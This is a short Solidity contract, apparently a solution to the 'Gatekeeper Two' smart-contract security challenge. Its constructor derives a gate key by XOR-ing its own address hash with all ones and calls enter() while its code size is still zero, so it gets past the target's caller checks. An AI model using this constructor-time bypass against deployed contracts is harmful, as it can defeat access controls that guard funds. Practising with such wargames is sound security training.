pragma solidity ^0.4.18;

contract GateKeyTwo {
  function GateKeyTwo(address gate) public {
    GatekeeperTwo _gate = GatekeeperTwo(gate);
    bytes8 key = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1));
    _gate.enter(key);
  }
}
